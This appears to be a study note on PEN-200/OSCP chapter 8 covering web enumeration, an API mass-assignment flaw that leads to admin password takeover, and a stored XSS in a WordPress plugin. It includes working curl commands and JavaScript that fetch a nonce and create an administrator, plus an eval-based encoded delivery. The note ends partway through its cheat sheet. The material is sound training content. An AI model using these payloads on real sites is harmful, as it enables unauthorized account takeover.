---
title: "PEN-200 Chapter 8 — Introduction to Web Application Attacks"
aliases:
  - "PEN-200 Ch 8"
  - "Introduction to Web Application Attacks"
tags:
  - oscp
  - pen-200
  - web
  - enumeration
  - burp-suite
  - api
  - xss
  - privilege-escalation
source: "PEN200_Chapter_08_Introduction_to_Web_Application_Attacks(1).pdf"
chapter: 8
status: study-note
---

# PEN-200 Chapter 8 — Introduction to Web Application Attacks

> [!summary]
> This chapter introduces a practical black-box web application workflow: identify the web technology stack, discover hidden content, inspect requests/responses, enumerate APIs, test application logic, identify XSS, and turn a stored XSS into application-level privilege escalation.

## Chapter map

- [[#8.1 Web Application Assessment Methodology]]
- [[#8.2 Web Application Assessment Tools]]
  - [[#8.2.1 Fingerprinting Web Servers with Nmap]]
  - [[#8.2.2 Technology Stack Identification with Wappalyzer]]
  - [[#8.2.3 Directory Brute Force with Gobuster]]
  - [[#8.2.4 Security Testing with Burp Suite]]
- [[#8.3 Web Application Enumeration]]
  - [[#8.3.1 Debugging Page Content]]
  - [[#8.3.2 Inspecting HTTP Response Headers and Sitemaps]]
  - [[#8.3.3 Enumerating and Abusing APIs]]
- [[#8.4 Cross-Site Scripting]]
  - [[#8.4.1 Stored vs Reflected XSS Theory]]
  - [[#8.4.2 JavaScript Refresher]]
  - [[#8.4.3 Identifying XSS Vulnerabilities]]
  - [[#8.4.4 Basic XSS]]
  - [[#8.4.5 Privilege Escalation via XSS]]
- [[#8.5 Wrapping Up]]
- [[#Attack chain connection]]
- [[#Mini cheat sheet]]

---

## 8.1 Web Application Assessment Methodology

The chapter starts by separating web-application testing into three broad engagement styles.

### White-box testing

You are given broad or unrestricted access to items such as:

- source code
- infrastructure information
- design documentation
- application logic

This gives a much more complete view of the application, but it also requires source-code review and application-logic analysis. Large codebases can make white-box work time-consuming.

### Black-box testing

Also called **zero-knowledge testing**. You receive little or no internal information about the application. Because of that, **enumeration becomes especially important**.

This is the methodology emphasized in this chapter because it develops the same discovery mindset needed when you face an unknown web application during an OSCP-style machine.

### Grey-box testing

You receive only limited information, such as:

- authentication methods
- credentials
- framework details
- restricted scope information

It sits between white-box and black-box testing.

### OWASP Top 10

The chapter references the **OWASP Top 10** as a useful collection of major web-application risk categories. The goal is not to memorize the list in isolation, but to understand recurring attack patterns that can be applied across different frameworks and technology stacks.

> [!important]
> The main lesson is that web technologies differ, but many vulnerability concepts repeat. Enumeration should tell you **what stack you are dealing with**, while testing should determine **how that specific application handles attacker-controlled input and application logic**.

---

## 8.2 Web Application Assessment Tools

This unit introduces the core tools used throughout the rest of the chapter:

| Tool | Main use in this chapter | When to use it |
|---|---|---|
| **Nmap** | Identify web-server software/version and perform HTTP NSE enumeration | Early service enumeration |
| **Wappalyzer** | Fingerprint technology stack | Quickly identify framework, server, libraries, CDN, etc. |
| **Gobuster** | Discover hidden files, directories, and API paths | After confirming a web service |
| **Burp Suite** | Intercept, inspect, modify, replay, and automate HTTP requests | Throughout web testing |
| **Firefox Developer Tools** | Inspect HTML, JavaScript, network traffic, cookies, DOM | Manual client-side enumeration |
| **curl** | Make controlled HTTP/API requests from the terminal | Fast API probing and reproducible tests |

---

## 8.2.1 Fingerprinting Web Servers with Nmap

The web server is a useful starting point because every traditional web application must expose a web service.

### Service/version scan

```bash
sudo nmap -p80 -sV 192.168.50.20
```

**Arguments**

- `sudo` — runs Nmap with elevated privileges.
- `nmap` — network scanner.
- `-p80` — scan only TCP port 80.
- `-sV` — perform service/version detection.
- `192.168.50.20` — target host.

**Why use it**

To identify the HTTP server and possibly its version. The chapter's example reveals:

```text
80/tcp open  http  Apache httpd 2.4.41 ((Ubuntu))
```

That gives you both a server product and an OS clue.

### ==HTTP enumeration with an NSE script==

```bash
sudo nmap -p80 --script=http-enum 192.168.50.20
```

**Arguments**

- `-p80` — scan HTTP on port 80.
- `--script=http-enum` — run Nmap's `http-enum` NSE script.

**Why use it**

`http-enum` tries known/common web paths and can reveal application-specific resources. The example discovers paths such as:

```text
/login.php
/db/
/css/
/images/
/js/
/uploads/
```

These are leads for deeper manual inspection.

> [!tip]
> Nmap is not only for finding open ports. Once you know a service is HTTP/HTTPS, use service-specific NSE scripts to collect application-level clues.

---

## 8.2.2 Technology Stack Identification with Wappalyzer

**Wappalyzer** performs technology fingerprinting against a web application.

```bash
wappalyzer https://example.com
```

The chapter uses it to identify components such as:

- operating system
- UI framework
- web server
- JavaScript libraries
- CDN services
- font libraries

The figure in the chapter illustrates findings including technologies such as Ubuntu, Bootstrap, Apache, jQuery, prettyPhoto, Google Hosted Libraries, and Font Awesome.

### Why it matters

Technology versions can influence later vulnerability research. For example, an outdated JavaScript library may have known security issues.

### When to use it

Use Wappalyzer near the beginning of web enumeration to quickly answer:

- What server appears to be running?
- What frontend framework is present?
- Is the application using WordPress or another CMS?
- Which JavaScript libraries are loaded?
- Are there CDN/cloud indicators?

Treat the result as **fingerprinting evidence**, not absolute truth. Confirm important findings through other sources such as headers, source code, Nmap, or Burp.

---

## 8.2.3 Directory Brute Force with Gobuster

Once a web service is found, map the application by discovering hidden files and directories.

### Basic directory enumeration

```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

**Arguments**

- `gobuster` — brute-force discovery tool.
- `dir` — directory/file discovery mode.
- `-u 192.168.50.20` — target URL/host.
- `-w /usr/share/wordlists/dirb/common.txt` — wordlist.
- `-t 5` — use five concurrent threads.

The default number of threads mentioned in the chapter is 10. Reducing `-t` lowers request volume.

### Example results

```text
/.hta            403
/.htaccess       403
/.htpasswd       403
/css             301
/db              301
/images          301
/index.php       302 -> ./login.php
/js              301
/server-status   403
/uploads         301
```

### Status-code interpretation

- `200` — resource is directly accessible.
- `301/302` — redirect; still very interesting.
- `403` — resource exists but access is forbidden.
- `404` — normally indicates no resource.

> [!warning]
> Gobuster can generate significant traffic. It is useful in labs and authorized penetration tests, but it is not stealthy.

### When to use it

Run directory discovery after identifying a web service. Interesting findings may include:

- login pages
- administrative consoles
- upload folders
- backups
- source files
- database interfaces
- API endpoints
- hidden application routes

---

## 8.2.4 Security Testing with Burp Suite

**Burp Suite** is the chapter's main manual HTTP testing platform.

Start it from Kali's application menu or from a terminal:

```bash
burpsuite
```

### Initial setup used in the chapter

1. Start Burp Suite.
2. Choose **Temporary project**.
3. Choose **Use Burp defaults**.
4. Start Burp.
5. Use Firefox as the external browser.

### Burp Proxy

A web proxy sits between the browser and web server. It can inspect and modify requests and responses.

Burp's default proxy listener in the chapter is:

```text
127.0.0.1:8080
```

Configure Firefox:

```text
Settings
→ Network Settings
→ Manual proxy configuration
→ 127.0.0.1
→ Port 8080
```

Enable the same proxy for all protocols if you want all browser traffic to pass through Burp.

#### Intercept controls

- **Intercept on** — Burp pauses requests.
- **Forward** — send the paused request.
- **Drop** — discard the request.
- **Intercept off** — allow normal browsing while still recording traffic.

If the browser appears to hang while Burp is running, check whether **Intercept is on**.

### HTTP History

Location:

```text
Proxy → HTTP History
```

Use this to review:

- method
- URL/path
- headers
- parameters
- cookies
- request body
- status code
- response headers
- response body

Burp shows the raw request and raw server response, which is extremely useful for understanding how the application actually communicates.

### Optional Firefox cleanup

Firefox may generate captive-portal traffic such as `detectportal.firefox.com`.

The chapter disables it through:

```text
about:config
network.captive-portal-service.enabled = false
```

This keeps Burp history cleaner.

---

### Burp Repeater

**Repeater** lets you resend the same HTTP request repeatedly while changing individual values.

Workflow:

```text
Proxy → HTTP History
→ right-click request
→ Send to Repeater
→ Repeater
→ edit request
→ Send
```

Use Repeater when testing:

- parameter manipulation
- headers
- cookies
- API bodies
- methods
- authentication behavior
- XSS payloads
- error handling

It is often the best Burp tool for deliberate manual testing.

---

### `/etc/hosts` setup

The chapter maps the target IP to the hostname `offsecwp`.

Display the hosts file:

```bash
cat /etc/hosts
```

Relevant entry:

```text
192.168.50.16 offsecwp
```

This allows requests such as:

```text
http://offsecwp/
http://offsecwp/wp-login.php
```

to resolve to the target IP.

---

### Burp Intruder

**Intruder** automates repeated requests with changing payload values.

The chapter demonstrates password guessing against WordPress.

Basic workflow:

1. Submit a deliberately failed login.
2. Find the POST request in **Proxy → HTTP History**.
3. Send it to **Intruder**.
4. Go to **Positions**.
5. Clear automatically selected positions.
6. Highlight only the `pwd` value.
7. Click **Add**.
8. Go to **Payloads**.
9. Paste a wordlist.
10. Click **Start Attack**.
11. Compare response status codes and lengths.

### Grab the first ten RockYou values

```bash
cat /usr/share/wordlists/rockyou.txt | head
```

**Arguments / components**

- `cat` — print the file.
- `/usr/share/wordlists/rockyou.txt` — common password wordlist.
- `|` — pipe output to the next command.
- `head` — show the first ten lines by default.

The example values include `password`, which is the correct credential in the lab scenario.

### What to compare in Intruder

Look for outliers in:

- HTTP status code
- response length
- redirects
- response text
- timing

A different response can identify a successful authentication attempt.

> [!important]
> Intruder is not limited to password testing. It is useful whenever you need to systematically vary one or more request values.

---

## 8.3 Web Application Enumeration

This section moves from general tools to application-specific mapping.

Before blindly trying exploits, identify the web application's stack:

```text
Operating system
→ Web server
→ Database
→ Backend language/framework
→ Frontend framework/libraries
→ Application routes
→ APIs
```

Passive information from earlier reconnaissance should be correlated with active testing. Public repositories, documentation, leaked credentials, or search-engine findings may explain paths you later discover manually.

---

## 8.3.1 Debugging Page Content

### Inspect the URL

File extensions can reveal implementation technology:

```text
.php   → PHP
.jsp   → Java/JSP
.do    → often Java frameworks
.html  → static HTML or routed application content
```

Modern frameworks often use **routes**, so the absence of an extension does not mean the technology cannot be identified.

### Firefox Debugger

Open Firefox Developer Tools and inspect JavaScript/resources.

Useful findings include:

- JavaScript framework names
- library versions
- hidden input fields
- comments
- endpoints
- client-side validation
- hardcoded values
- JavaScript functions

The chapter identifies **jQuery 3.6.0** in the example.

### Pretty-print minified JavaScript

Minified JavaScript is difficult to read. Firefox's **Pretty print source** button (`{ }`) reformats it into a more readable layout.

Use this before analyzing complex JavaScript for:

- API endpoints
- client-side access checks
- hidden parameters
- tokens
- interesting functions

### Firefox Inspector

Right-click an element and choose:

```text
Inspect
```

The Inspector highlights the corresponding DOM/HTML.

Useful for quickly locating:

- form names
- input names
- hidden fields
- IDs/classes
- client-side constraints
- action URLs

> [!tip]
> Client-side restrictions are not security boundaries. If HTML limits an input, Burp can still modify the resulting HTTP request.

---

## 8.3.2 Inspecting HTTP Response Headers and Sitemaps

### Firefox Network tool

Open:

```text
Web Developer Tools → Network
```

==Then refresh the page because the Network panel records activity after it is opened.==

Inspect requests and responses, especially headers.

### Useful response headers

Examples discussed in the chapter:

```text
Server
X-Powered-By
X-Aspnet-Version
x-amz-cf-id
X-Forwarded-For
```

Potential information:

- `Server` — web-server product/version.
- `X-Powered-By` — backend technology.
- `X-Aspnet-Version` — ASP.NET version clue.
- `x-amz-cf-id` — Amazon CloudFront indicator.
- `X-Forwarded-For` — often added by a proxy to record original client IP.

Headers may come from the server, proxy, CDN, framework, or application.

### `robots.txt`

Retrieve it with:

```bash
curl https://www.google.com/robots.txt
```

`curl` performs an HTTP request and prints the response body.

Common directives:

```text
User-agent: *
Disallow: /search
Allow: /search/about
```

**Why it matters**

`robots.txt` is meant for search-engine crawlers, not access control. A `Disallow` entry can accidentally advertise:

- admin pages
- sensitive directories
- old application paths
- internal naming conventions

Also check sitemap files because they may expose unlinked routes.

> [!reminder]
> `robots.txt` does **not** make a path private. It only asks compliant crawlers not to index it.

---

## 8.3.3 Enumerating and Abusing APIs

Modern applications often rely heavily on backend APIs. The chapter focuses on REST-style API discovery and logic testing in a black-box scenario.

### Common API naming pattern

```text
/api_name/v1
```

API endpoints often contain a descriptive resource name plus a version.

---

### Gobuster patterns for API versions

Create a pattern file named `pattern`:

```text
{GOBUSTER}/v1
{GOBUSTER}/v2
```

The `{GOBUSTER}` placeholder is replaced by each word from the supplied wordlist.

Run:

```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

**Arguments**

- `dir` — directory discovery mode.
- `-u` — base API URL.
- `-w` — wordlist.
- `-p pattern` — file containing expansion patterns.

The example discovers:

```text
/books/v1
/console
/ui
/users/v1
```

> [!note]
> The chapter has an internal port inconsistency: its narrative/output refers to the API gateway on **5001**, while several printed `curl`/Gobuster commands use **5002**. This note preserves the commands as printed; on a real target, use the port actually discovered during enumeration.

The `/ui` endpoint exposes API documentation in the lab, which is extremely valuable when available.

---

### Inspect `/users/v1`

```bash
curl -i http://192.168.50.16:5002/users/v1
```

**Arguments**

- `curl` — send HTTP request.
- `-i` — include HTTP response headers in output.

The JSON response reveals usernames and email addresses, including an `admin` user.

Why this matters:

- usernames become authentication targets
- account names may reveal roles
- exposed data can lead to additional endpoint discovery

---

### Enumerate properties below the admin object

```bash
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

The chapter discovers:

```text
/email      405
/password   405
```

A **405 Method Not Allowed** is important because it indicates that the route exists, but the HTTP method is not accepted.

---

### Probe the password endpoint

```bash
curl -i http://192.168.50.16:5002/users/v1/admin/password
```

Response:

```text
405 METHOD NOT ALLOWED
```

Interpretation:

- path likely exists
- `GET` is not accepted
- try other HTTP methods such as `POST`, `PUT`, or `PATCH`

---

### Probe the login endpoint

```bash
curl -i http://192.168.50.16:5002/users/v1/login
```

The response says the user was not found even though the HTTP status is shown as 404. That application-level message is a clue that the login route itself exists.

> [!important]
> Do not rely only on status codes. Read the JSON/body and compare behavior.

---

### ==POST JSON to the login API==

```bash
curl -d '{"password":"fake","username":"admin"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/login
```

**Arguments**

- `-d '...'` — sends request data; curl uses POST when `-d` is provided unless another method is specified.
- `-H 'Content-Type: application/json'` — tells the server the body contains JSON.

Response:

```text
Password is not correct for the given username.
```

This confirms:

- `admin` is a valid username
- JSON structure is correct
- the login endpoint accepts this request format

---

### Try registration

```bash
curl -d '{"password":"lab","username":"offsecadmin"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/register
```

The API responds that `email` is required.

This is useful because validation errors help reconstruct undocumented schemas.

---

### Test an undocumented `admin` property

```bash
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/register
```

The API accepts the request.

This is a **business-logic / authorization flaw**: a client should not be allowed to self-assign an administrative role simply by adding an `admin` field.

---

### Log in with the newly created user

```bash
curl -d '{"password":"lab","username":"offsec"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/login
```

The API returns a **JWT authentication token**.

The token proves successful authentication and can be used for authenticated API requests.

---

### Try to change the existing administrator's password with POST

```bash
curl \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <JWT_TOKEN>' \
  -d '{"password": "pwned"}'
```

**Arguments**

- `-H 'Authorization: OAuth <JWT_TOKEN>'` — supplies the authentication token.
- `-d '{"password": "pwned"}'` — desired replacement password.

The API returns:

```text
405 Method Not Allowed
```

This suggests that the endpoint exists but POST is the wrong method.

---

### Change the password using PUT

```bash
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <JWT_TOKEN>' \
  -d '{"password": "pwned"}'
```

**Arguments**

- `-X 'PUT'` — explicitly sets HTTP method to PUT.
- `-H` — supplies JSON content type and authorization.
- `-d` — new password value.

The lack of an error suggests the update succeeded.

---

### Verify takeover by logging in as `admin`

```bash
curl -d '{"password":"pwned","username":"admin"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/login
```

A successful login confirms administrator-account takeover.

### Vulnerability chain

```text
Enumerate API
→ enumerate users
→ discover /register and /login
→ infer required JSON fields
→ add client-controlled admin=True
→ obtain admin-level token
→ enumerate method behavior
→ use PUT on /admin/password
→ verify admin login
```

==This is an excellent OSCP lesson: the vulnerability is not necessarily a known CVE. It is an **application logic flaw** discovered by understanding the API.==

---

### Send curl traffic through Burp

The chapter then moves API testing into Burp by adding:

```bash
--proxy 127.0.0.1:8080
```

Example pattern:

```bash
curl --proxy 127.0.0.1:8080 <URL>
```

**Argument**

- `--proxy 127.0.0.1:8080` — route the request through Burp.

Benefits:

- preserve request history
- manually edit requests in Repeater
- compare responses
- send requests to Intruder
- build a site map

Useful Burp location:

```text
Target → Site map
```

Site Map organizes discovered hosts, paths, and requests.

---

## 8.4 Cross-Site Scripting

**Cross-Site Scripting (XSS)** occurs when attacker-controlled content is placed into a page in a way that causes JavaScript or other executable browser content to run in another user's browser.

The root issue is usually inadequate **input handling/output encoding**.

---

## 8.4.1 Stored vs Reflected XSS Theory

### Stored XSS

Also called **persistent XSS**.

Flow:

```text
Attacker submits payload
→ application stores it
→ another user loads affected page
→ browser executes payload
```

Typical locations:

- forum posts
- comments
- reviews
- profile fields
- stored request metadata

Stored XSS is especially useful to an attacker because one submitted payload may affect multiple users later.

### Reflected XSS

The payload is supplied in a request or link and immediately reflected into the returned page.

Flow:

```text
Victim opens crafted URL/request
→ application reflects attacker-controlled value
→ browser executes it
```

Common locations:

- search results
- error messages
- query parameters

### DOM-based XSS

DOM-based XSS occurs when client-side JavaScript modifies the DOM using attacker-controlled values in an unsafe way.

Important distinction:

> The victim's **browser** executes the injected JavaScript in the security context of the vulnerable site.

Possible impact discussed in the chapter includes:

- session hijacking
- redirects
- modifying page content
- credential theft
- malicious actions in the victim's authenticated session

---

## 8.4.2 JavaScript Refresher

JavaScript executes in the browser and can read/modify the page's DOM.

### Example function

```javascript
function multiplyValues(x,y) {
  return x * y;
}

let a = multiplyValues(3, 5)
console.log(a)
```

### What it demonstrates

- function declaration
- parameters
- return value
- variables
- browser console output

Firefox Web Console can be opened through Developer Tools. The figure in the chapter shows the common shortcut:

```text
Ctrl+Shift+K
```

### Why JavaScript matters for XSS

If you can inject JavaScript into a vulnerable page, you may be able to:

- modify the DOM
- submit forms
- make HTTP requests
- read accessible page data
- redirect users
- access cookies that are not protected by `HttpOnly`

---

## 8.4.3 Identifying XSS Vulnerabilities

Look for input that is later rendered into a page.

Potential entry points:

- search fields
- comments
- headers
- form fields
- profile data
- URL parameters

### Probe with special characters

```text
< > ' " { } ;
```

Why these matter:

- `<` and `>` — HTML tags/elements
- `'` and `"` — strings/attribute boundaries
- `{` and `}` — JavaScript block syntax
- `;` — JavaScript statement separator

If input is returned without being removed or safely encoded, it may be possible to break out of the intended context.

### URL encoding

Example:

```text
space → %20
```

### HTML encoding

The chapter's page image shows the example:

```text
< → &lt;
```

If `<` is encoded as `&lt;`, the browser displays the character instead of treating it as the beginning of an HTML tag.

### Context matters

If input lands between HTML elements, you may need full tags:

```html
<script>...</script>
```

If input lands inside existing JavaScript, quotes or semicolons may be enough to escape the original context.

> [!tip]
> Always determine **where your input appears** before designing an XSS payload. Payload construction depends on the output context.

---

## 8.4.4 Basic XSS

The target WordPress site uses a vulnerable plugin named **Visitors**.

The plugin stores request metadata, including the `User-Agent` header.

### Vulnerable PHP storage logic

The chapter shows the plugin storing attacker-controlled headers:

```php
function VST_save_record() {
  global $wpdb;
  $table_name = $wpdb->prefix . 'VST_registros';
  VST_create_table_records();
  return $wpdb->insert(
    $table_name,
    array(
      'patch' => $_SERVER["REQUEST_URI"],
      'datetime' => current_time( 'mysql' ),
      'useragent' => $_SERVER['HTTP_USER_AGENT'],
      'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
    )
  );
}
```

The key values are:

```php
$_SERVER['HTTP_USER_AGENT']
$_SERVER['HTTP_X_FORWARDED_FOR']
```

Both are derived from HTTP request headers and are therefore potentially attacker-controlled.

### Vulnerable output logic

The plugin later renders the stored `useragent` directly inside a table cell:

```php
<td>'.$record->useragent.'</td>
```

There is no output sanitization/encoding before rendering the value.

That produces the stored-XSS path:

```text
attacker-controlled User-Agent
→ database
→ WordPress admin loads Visitors page
→ User-Agent printed into HTML
→ browser executes injected script
```

### ==Proof-of-concept payload==

```html
<script>alert(42)</script>
```

The chapter inserts this into the **User-Agent** header using Burp Repeater.

Workflow:

```text
Browse to http://offsecwp/
→ Proxy → HTTP History
→ Send to Repeater
→ replace User-Agent with XSS payload
→ Send
```

Payload:

```http
User-Agent: <script>alert(42)</script>
```

A `200 OK` indicates the request was accepted. When an administrator later opens the Visitors plugin, the browser displays an alert with `42`, confirming stored XSS.

### Why `alert()` is useful

`alert()` is not the final attack goal. It is a simple visual proof that:

- attacker-controlled JavaScript reached the page
- browser interpreted it as JavaScript
- the vulnerable context is exploitable

---

## 8.4.5 Privilege Escalation via XSS

This section shows how XSS can become **application-level privilege escalation**.

The goal is to make an administrator's browser create a new WordPress administrator account.

### First idea: steal session cookies

Inspect cookies in Firefox:

```text
Developer Tools
→ Storage
→ Cookies
→ http://offsecwp
```

Relevant cookie flags:

- **Secure** — browser sends cookie only over encrypted HTTPS connections.
- **HttpOnly** — JavaScript cannot read the cookie.

The WordPress session cookies in the lab use `HttpOnly`, so stealing them directly with JavaScript is not viable.

> [!important]
> XSS can still be powerful even when cookies are HttpOnly. The malicious script executes **inside the authenticated administrator's browser**, so it can often perform authenticated actions on the administrator's behalf.

---

### CSRF and WordPress nonces

A CSRF attack tricks an authenticated user into making an unwanted request.

The chapter gives the conceptual example:

```html
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000">
  Check out these awesome cat memes!
</a>
```

WordPress uses a server-generated **nonce** in sensitive requests to make simple CSRF attacks harder.

However, XSS runs in the legitimate origin and can request the page containing the nonce, extract it, and then use it.

---

### JavaScript: retrieve the WordPress nonce

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

### What each line does

- `new XMLHttpRequest()` — create an HTTP request object.
- `requestURL` — administrative user-creation page.
- `nonceRegex` — regex used to locate the nonce in returned HTML.
- `.open("GET", requestURL, false)` — prepare a synchronous GET.
- `.send()` — send the request.
- `.responseText` — returned HTML.
- `.exec(...)` — extract the nonce.
- `nonceMatch[1]` — captured nonce value.

Because the JavaScript executes as the logged-in admin in the vulnerable site origin, the request is made with the admin's authenticated session.

---

### JavaScript: create a new administrator

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+
"&user_login=attacker&email=attacker@offsec.com"+
"&pass1=attackerpass&pass2=attackerpass&role=administrator";

ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader(
  "Content-Type",
  "application/x-www-form-urlencoded"
);
ajaxRequest.send(params);
```

### Key parameters

- `action=createuser` — create a WordPress user.
- `_wpnonce_create-user=<nonce>` — anti-CSRF token gathered dynamically.
- `user_login=attacker` — new username.
- `email=attacker@offsec.com` — email.
- `pass1=attackerpass`
- `pass2=attackerpass` — password confirmation.
- `role=administrator` — request administrative privileges.

Attack concept:

```text
stored XSS executes as admin
→ script retrieves nonce
→ script submits authenticated user-creation POST
→ new attacker-controlled administrator is created
```

---

### Minify the JavaScript

The chapter uses **JSCompress** to convert the payload into a compact one-line script.

Why:

- easier to place in a header
- fewer formatting issues
- easier to encode and transport

---

### Encode JavaScript as UTF-16 character codes

```javascript
function encode_to_javascript(string) {
  var input = string
  var output = '';
  for(pos = 0; pos < input.length; pos++) {
    output += input.charCodeAt(pos);
    if(pos != (input.length - 1)) {
      output += ",";
    }
  }
  return output;
}

let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

### Important methods

- `charCodeAt(pos)` — converts a character to its UTF-16 code unit.
- `console.log(encoded)` — prints the generated comma-separated numeric sequence.

Why encode it:

- avoid transport problems with special characters
- embed the script in a more predictable one-line payload

---

### ==Decode and execute the encoded JavaScript==

The chapter then uses:

```javascript
String.fromCharCode(...)
```

to reconstruct the original JavaScript string and:

```javascript
eval(...)
```

to execute it.

Conceptual payload:

```html
<script>
eval(String.fromCharCode(<ENCODED_UTF16_SEQUENCE>))
</script>
```

The exact numeric sequence is generated from the preceding minified JavaScript, so the reusable part for exam notes is the transformation workflow rather than memorizing a fixed sequence.

---

### Deliver the final payload with curl and Burp

The chapter's command structure is:

```bash
curl -i http://offsecwp \
  --user-agent "<script>eval(String.fromCharCode(<ENCODED_UTF16_SEQUENCE>))</script>" \
  --proxy 127.0.0.1:8080
```

**Arguments**

- `-i` — display response headers.
- `http://offsecwp` — vulnerable target.
- `--user-agent "..."` — replace the HTTP `User-Agent` header with the XSS payload.
- `--proxy 127.0.0.1:8080` — send the request through Burp.

The PDF prints the full generated numeric sequence. It is not a fixed exploit constant; it is the encoded result of the previous JavaScript. Generate it from your own payload instead of memorizing the sequence.

### Burp handling

Before sending:

```text
Start Burp
→ Intercept on
→ run curl command
→ inspect payload
→ Forward
→ Intercept off
```

Then simulate the administrator visiting the vulnerable Visitors page.

When that happens:

```text
stored payload loads
→ JavaScript retrieves nonce
→ authenticated POST is submitted
→ attacker administrator account is created
```

The chapter verifies success by opening the WordPress **Users** page and observing the new account.

### Result

The attack escalates from a normal web user / unauthenticated request context to **WordPress administrator**.

The chapter notes that, from there, an attacker could potentially continue toward host-level access, for example by abusing WordPress plugin functionality to place server-side code. That host-compromise step is not developed in this chapter.

---

## 8.5 Wrapping Up

Chapter 8 builds a complete introductory web-application testing workflow:

```text
Fingerprint web server
→ identify technology stack
→ discover hidden paths
→ proxy and inspect traffic
→ enumerate source, headers, cookies, routes
→ discover APIs
→ test methods and JSON schemas
→ identify application logic flaws
→ identify XSS
→ turn stored XSS into application-level privilege escalation
```

The two major exploitation examples are:

1. **API authorization/business-logic flaw**
   - self-register an administrative user
   - obtain a token
   - use authenticated API functionality to change the real admin password

2. **Stored XSS**
   - inject JavaScript through the `User-Agent`
   - have an administrator's browser execute it
   - dynamically retrieve a WordPress nonce
   - create a new WordPress administrator

---

# Tools and commands reference

## Nmap

```bash
sudo nmap -p80 -sV 192.168.50.20
```

Use for web-server product/version detection.

```bash
sudo nmap -p80 --script=http-enum 192.168.50.20
```

Use for HTTP path/service enumeration with NSE.

---

## Wappalyzer

No CLI command is used in the chapter.

Use Technology Lookup / browser-based fingerprinting to identify:

- OS
- server
- framework
- JavaScript libraries
- CDN
- frontend components

---

## Gobuster

```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

Directory discovery with five threads.

```bash
gobuster dir -u http://192.168.50.16:5002 \
  -w /usr/share/wordlists/dirb/big.txt \
  -p pattern
```

API discovery using version patterns.

```bash
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ \
  -w /usr/share/wordlists/dirb/small.txt
```

Enumerate properties below a discovered API resource.

---

## Burp Suite

```bash
burpsuite
```

Launch Burp.

Core features used:

```text
Proxy
HTTP History
Intercept
Repeater
Intruder
Target → Site map
```

Default listener:

```text
127.0.0.1:8080
```

---

## Linux shell

```bash
cat /etc/hosts
```

Inspect hostname mappings.

```bash
cat /usr/share/wordlists/rockyou.txt | head
```

Display first ten RockYou entries.

---

## curl

```bash
curl https://www.google.com/robots.txt
```

Retrieve `robots.txt`.

```bash
curl -i http://192.168.50.16:5002/users/v1
```

GET an API route and include headers.

```bash
curl -i http://192.168.50.16:5002/users/v1/admin/password
```

Test route existence/method behavior.

```bash
curl -i http://192.168.50.16:5002/users/v1/login
```

Probe login route.

```bash
curl -d '{"password":"fake","username":"admin"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/login
```

POST JSON login data.

```bash
curl -d '{"password":"lab","username":"offsecadmin"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/register
```

Infer required registration fields from validation errors.

```bash
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/register
```

Test client-controlled role assignment.

```bash
curl -d '{"password":"lab","username":"offsec"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/login
```

Log in and obtain token.

```bash
curl \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <JWT_TOKEN>' \
  -d '{"password": "pwned"}'
```

Try password modification using POST.

```bash
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <JWT_TOKEN>' \
  -d '{"password": "pwned"}'
```

Use PUT to replace the administrator password.

```bash
curl -d '{"password":"pwned","username":"admin"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/login
```

Verify takeover.

```bash
curl --proxy 127.0.0.1:8080 <URL>
```

Route curl traffic through Burp.

```bash
curl -i http://offsecwp \
  --user-agent "<script>eval(String.fromCharCode(<ENCODED_UTF16_SEQUENCE>))</script>" \
  --proxy 127.0.0.1:8080
```

Deliver the final stored-XSS payload while inspecting it through Burp.

---

## Firefox Developer Tools

Used tools:

```text
Debugger
Inspector
Network
Console
Storage
```

Useful shortcut shown in the chapter:

```text
Ctrl+Shift+K
```

for the Web Console.

---

## JavaScript

Basic proof:

```html
<script>alert(42)</script>
```

Nonce extraction:

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

Create admin:

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+
"&user_login=attacker&email=attacker@offsec.com"+
